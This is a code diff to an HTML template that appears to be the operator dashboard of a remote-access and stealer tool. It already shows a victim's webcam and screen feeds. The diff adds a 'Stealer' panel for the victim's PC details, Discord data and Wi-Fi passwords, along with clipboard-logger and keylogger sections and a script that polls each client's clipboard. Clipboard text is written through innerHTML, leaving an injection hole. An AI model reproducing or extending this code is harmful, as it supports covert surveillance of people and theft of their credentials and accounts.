@@ -2,15 +2,30 @@
 <html>
 <head>
     <title>Video Feed</title>
+    <style>
+        .container {
+            width: 100%;
+            overflow: hidden;
+        }
+        .box {
+            border: solid black;
+            width: 48%;
+            float: left;
+        }
+        .center {
+            text-align: center;
+            font-size: 50px;
+        }
+    </style>
 </head>
 <body>
     <a href="/">
-        <button>Back</button>
+        <button style="width: 200px; height: 100px;">Back</button>
     </a>
 
     <br><br>
 
-    <img id="camera-feed" src="/get_camera_frame?id={{ clientId }}" alt="Video Feed">
+    <img id="camera-feed" src="/get_camera_frame?id={{ clientId }}" alt="Video Feed" style="max-width: 500px;">
 
     <!-- Поле ввода для скорости обновления -->
     <label for="update-interval">Скорость обновления (в миллисекундах):</label>
@@ -19,15 +34,40 @@
     <br>
     <br>
 
-    <img id="screen-feed" src="/get_screen_frame?id={{ clientId }}" alt="screen Feed">
+    <img id="screen-feed" src="/get_screen_frame?id={{ clientId }}" alt="screen Feed" style="max-width: 1000px;">
 
     <!-- Поле ввода для скорости обновления -->
     <label for="screen-update-interval">Скорость обновления (в миллисекундах):</label>
     <input type="number" id="screen-update-interval" value="1000">
 
-    <div>
-        <h1>Console: </h1>
 
+    <h1 class="center">Stealer:</h1>
+    <div class="container">
+        <div class="box">
+            <h2>Pc information:</h2>
+            <h3>{{ systeminfo | safe }}</h3>
+        </div>
+        <div class="box">
+            <h2>Passwords and etc:</h2>
+            <h2>Discord:</h2>
+            <h3>{{ Discordinfo | safe }}</h3>
+            <h2>Wifi passwords:</h2>
+            <h3>SSID: | Password:</h3>
+            <h3>{{ Wifis | safe }}</h3>
+        </div>
+    </div>
+
+    <h1 class="center">Loggers:</h1>
+
+    <div class="container">
+        <div class="box">
+            <h2>ClipboardLogger:</h2>
+            <h3 id="clipboard"></h3>
+        </div>
+        <div class="box">
+            <h2>KeyLogger:</h2>
+            <h3>test</h3>
+        </div>
     </div>
 
 
@@ -53,6 +93,27 @@
             setTimeout(screenAutoRefresh, screenupdateInterval); // Обновляем изображение с учетом введенного интервала
         }
         screenAutoRefresh();
+
+        function clipboardAutoRefresh() {
+            const h3Element = document.getElementById('clipboard');
+            setInterval(() => {
+                fetch('/get_clipboard?id={{ clientId }}')
+                    .then(response => {
+                        if (!response.ok) throw new Error('Network response was not ok');
+                        return response.text();
+                    })
+                    .then(newText => {
+                        const containsHTML = newText.includes('<');
+                        if (containsHTML) h3Element.innerHTML = newText;
+                        else h3Element.textContent = newText;
+                    })
+                    .catch(error => {
+                        console.error('Problem with fetch operation:', error);
+                    });
+            }, 10000);
+        }
+
+        clipboardAutoRefresh();
 
     </script>
 </body>
